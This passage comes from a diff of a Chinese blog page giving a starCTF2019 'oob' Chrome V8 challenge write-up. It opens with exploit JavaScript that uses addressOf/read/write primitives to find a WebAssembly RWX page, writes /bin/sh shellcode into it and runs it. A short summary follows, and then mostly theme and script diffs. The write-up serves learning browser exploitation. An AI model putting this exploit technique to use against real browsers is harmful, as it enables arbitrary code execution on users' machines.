class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj_array);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_array);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(fake_obj);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(float_array_map)), <span class="string">&quot;, obj array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(obj_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_addr = <span class="title function_">addressOf</span>(f);</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(wasm_addr) + <span class="number">0x18n</span>));</span><br><span class="line"><span class="keyword">var</span> data_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(shared_info_addr) + <span class="number">0x8n</span>));</span><br><span class="line"><span class="keyword">var</span> instance_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(data_addr) + <span class="number">0x10n</span>));</span><br><span class="line"><span class="keyword">var</span> shellcode_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(instance_addr) + <span class="number">0x88n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wasm_addr: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(wasm_addr)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shared_info_addr: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(shared_info_addr)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data_addr: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(data_addr)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance_addr: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(instance_addr)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shellcode_addr: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(shellcode_addr)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode=[</span><br><span class="line">    <span class="number">0x6e69622fbb48f631n</span>,</span><br><span class="line">    <span class="number">0x5f54535668732f2fn</span>,</span><br><span class="line">    <span class="number">0x00050fd231583b6an</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(data_buf)) + <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(buf_backing_store_addr, shellcode_addr);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  data_view.<span class="title function_">setBigUint64</span>(<span class="number">8</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
 
 <p>运行结果：</p>
-<p><img src="/css/images/starctf2019_oob/2021031608.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/starctf2019_oob/2021031608.png" srcset="/img/loading.gif" lazyload></p>
 <hr>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的看一遍下来，还是挺好玩的，不过没有读过v8源码，有点地方还是不甚清晰。</p>
 <p>相比PHP的UAF玩法，chrome的越界读写漏洞操作起来更简单一些，理解难度也要低一些。</p>
@@ -382,83 +494,165 @@
 <p><a href="https://www.freebuf.com/vuls/203721.html">starCTF2019-1</a></p>
 <p><a href="https://www.anquanke.com/post/id/219815#h3-7">starCTF2019-2</a></p>
 
-            </div>
-            <hr>
+                
+              </div>
+            
+            <hr/>
             <div>
-              <p>
-                
-                
-                  <span>
-                <i class="iconfont icon-tag"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
-                    
-                      <a class="hover-with-bg" href="/tags/Chrome/">Chrome</a>
-                    
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/" class="print-no-link">#Web</a>
+      
+        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" class="print-no-link">#二进制</a>
+      
+        <a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/" class="print-no-link">#浏览器</a>
+      
+        <a href="/tags/Chrome/" class="print-no-link">#Chrome</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Chrome浏览器漏洞入门</div>
+      <div>http://yoursite.com/2021/03/16/Chrome浏览器漏洞入门/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Aluvion</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年3月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
                   </span>
-                
-              </p>
+                </a>
               
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
               
-              
-                <div class="post-prevnext row">
-                  <div class="post-prev col-12 col-md-6">
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
                     
-                      <a href="/2021/04/07/chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%BC%BA%E5%8C%961/">
-                        <i class="fa fa-chevron-left"></i>
-                        <span>chrome浏览器漏洞强化1</span>
+                    
+                      <a href="/2021/04/07/chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%BC%BA%E5%8C%961/" title="chrome浏览器漏洞强化1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">chrome浏览器漏洞强化1</span>
+                        <span class="visible-mobile">上一篇</span>
                       </a>
                     
-                  </div>
-                  <div class="post-next col-12 col-md-6">
+                  </article>
+                  <article class="post-next col-6">
                     
-                      <a href="/2021/03/02/%E4%BB%8EFTP%E5%88%B0PHP-FPM/">
-                        <span>从FTP到PHP-FPM</span>
-                        <i class="fa fa-chevron-right"></i>
+                    
+                      <a href="/2021/03/02/%E4%BB%8EFTP%E5%88%B0PHP-FPM/" title="从FTP到PHP-FPM">
+                        <span class="hidden-mobile">从FTP到PHP-FPM</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
                       </a>
                     
-                  </div>
+                  </article>
                 </div>
               
             </div>
 
-              
-          </div>
+            
+          </article>
         </div>
       </div>
     </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc-start"></div>
-<div id="toc">
-  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
-  <div id="tocbot"></div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
 </div>
 
-      </div>
-    
+
+
+  </aside>
+
+
+    </div>
   </div>
 </div>
 
-<!-- Custom -->
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
 
 
     
-  </main>
 
-  
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
-    </a>
-  
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
      aria-hidden="true">
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
@@ -471,194 +665,185 @@
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
     </div>
   </div>
 </div>
-  
 
-  
+    
 
-  
+    
+  </main>
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <div>
-      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-      <i class="iconfont icon-love"></i>
-      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
-    
-
-    
-
-    
-  </div>
-</footer>
-
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
-<script  src="/js/main.js" ></script>
-
-
-  <script  src="/js/lazyload.js" ></script>
-
-
-
   
-  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
   <script>
-    $(document).ready(function () {
-      var navHeight = $('#navbar').height();
-      var toc = $('#toc');
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
-      var tocLimMax = 2 * boardTop + boardCtn.height();
-
-      $(window).scroll(function () {
-        var tocLimMin = $('#toc-start').offset().top - navHeight;
-        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
-
-        if (tocLimMin <= scroH && scroH <= tocLimMax) {
-          toc.css({
-            'display': 'block',
-            'position': 'fixed',
-            'top': navHeight,
-          });
-        } else if (scroH <= tocLimMin) {
-          toc.css({
-            'position': '',
-            'top': '',
-          });
-        } else if (scroH > tocLimMax) {
-          toc.css('display', 'none');
-        }
-      });
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '.post-content',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc > p').css('visibility', 'visible');
-      }
-      var offset = boardCtn.css('margin-right')
-      $('#toc-ctn').css({
-        'right': offset
-      })
-    });
-  </script>
-
-
-
-
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-<!-- Plugins -->
-
-
-
-  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      $('pre').addClass('prettyprint  linenums');
-      prettyPrint();
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
     })
   </script>
 
 
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
   <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "Chrome浏览器漏洞入门&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
       
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
+        typing(text);
+      
+    })(window, document);
   </script>
 
 
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
 
   <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      getSearchFile(path);
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
-      function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
-        $(this).wrap(element);
-      }
-    );
-  </script>
 
 
 
 
 
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
 
 
+  
 
-
-
-
-
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
